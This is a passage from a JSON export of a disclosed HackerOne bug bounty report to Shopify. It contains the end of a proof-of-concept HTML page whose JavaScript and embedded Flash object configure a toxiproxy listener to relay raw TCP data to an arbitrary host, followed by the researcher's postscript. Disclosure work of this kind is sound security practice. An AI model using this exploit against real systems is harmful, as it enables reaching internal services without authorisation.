class=\"nx\">target</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">URL</span><span class=\"p\">(</span><span class=\"s2\">&quot;http://&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">prompt</span><span class=\"p\">(</span><span class=\"s2\">&quot;Enter the TCP host/ip pair you would like to connect to:&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;localhost:9999&quot;</span><span class=\"p\">));</span>\n                        <span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n                            <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n                            <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n                            <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n                                <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;policy&quot;</span><span class=\"p\">,</span>\n                                <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:7654&quot;</span><span class=\"p\">,</span>\n                                <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">host</span><span class=\"p\">,</span>\n                                <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n                            <span class=\"p\">}),</span>\n                        <span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n                            <span class=\"kd\">let</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"nx\">prompt</span><span class=\"p\">(</span><span class=\"s2\">&quot;Enter the data you would like to send:&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;Hello World&quot;</span><span class=\"p\">);</span>\n                            <span class=\"kd\">let</span> <span class=\"nx\">response</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&quot;</span><span class=\"p\">;</span>\n                            <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onsocketdata</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">socketData</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n                                <span class=\"nx\">response</span> <span class=\"o\">+=</span> <span class=\"nx\">socketData</span><span class=\"p\">;</span>\n                            <span class=\"p\">};</span>\n                            <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onsocketclose</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n                                <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"s2\">`&lt;pre&gt;Got Response:\\n</span><span class=\"p\">${</span><span class=\"nx\">response</span><span class=\"p\">}</span><span class=\"s2\">&lt;/pre&gt;`</span><span class=\"p\">);</span>\n                            <span class=\"p\">};</span>\n                            <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">connect</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">hostname</span><span class=\"p\">,</span> <span class=\"mi\">7654</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">);</span>\n                        <span class=\"p\">});</span>\n                    <span class=\"p\">};</span>\n                    <span class=\"c1\">// Trigger the first cache</span>\n                    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">flash</span><span class=\"p\">)</span>\n                    <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">connect</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">hostname</span><span class=\"p\">,</span> <span class=\"mi\">7654</span><span class=\"p\">,</span> <span class=\"s2\">&quot;cache&quot;</span><span class=\"p\">);</span>\n                <span class=\"p\">});</span>\n            <span class=\"p\">}</span>\n        <span class=\"nt\">&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;/head&gt;</span>\n    <span class=\"nt\">&lt;body&gt;</span>\n        <span class=\"nt\">&lt;object</span> <span class=\"na\">id=</span><span class=\"s\">&quot;flash&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;flash&quot;</span> <span class=\"na\">type=</span><span class=\"s\">&quot;application/x-shockwave-flash&quot;</span> <span class=\"na\">data=</span><span class=\"s\">&quot;10495ef1-3be0-49b2-8872-2f09e29ad848.swf&quot;</span><span class=\"nt\">&gt;</span>\n            <span class=\"nt\">&lt;param</span> <span class=\"na\">name=</span><span class=\"s\">&quot;movie&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;10495ef1-3be0-49b2-8872-2f09e29ad848.swf&quot;</span> <span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;param</span> <span class=\"na\">name=</span><span class=\"s\">&quot;AllowScriptAccess&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;always&quot;</span> <span class=\"nt\">/&gt;</span>\n        <span class=\"nt\">&lt;/object&gt;</span>\n    <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<h1 id=\"postscript\">Postscript</h1>\n\n<p>I know this was a rather long report, and it&#39;s fundamentally a pretty simple issue, however it&#39;s a rather unique issue once you get into exploitation and I had a lot of fun working on it, I hope you guys enjoy it too.</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}